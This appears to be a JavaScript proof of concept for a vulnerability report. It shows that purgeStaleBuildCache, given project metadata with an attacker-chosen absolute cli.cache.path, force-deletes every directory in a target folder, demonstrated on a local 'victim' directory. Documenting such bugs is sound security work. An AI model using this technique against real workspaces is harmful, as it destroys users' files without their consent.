// E2 amplifier PoC: purgeStaleBuildCache with an attacker-chosen absolute cli.cache.path
import { purgeStaleBuildCache } from './purge-cache.bundle.mjs';
import { readdirSync } from 'node:fs';
import path from 'node:path';
const victim = path.join(import.meta.dirname, 'victim');
console.log('victim BEFORE:', readdirSync(victim).join(','));
const context = {
  workspaceRoot: import.meta.dirname,
  target: { project: 'app' },
  getProjectMetadata: async () => ({ cli: { cache: { path: victim, enabled: true, environment: 'local' } } }),
};
await purgeStaleBuildCache(context);
console.log('victim AFTER :', readdirSync(victim).join(',') || '(EMPTY — every dir force-deleted)');
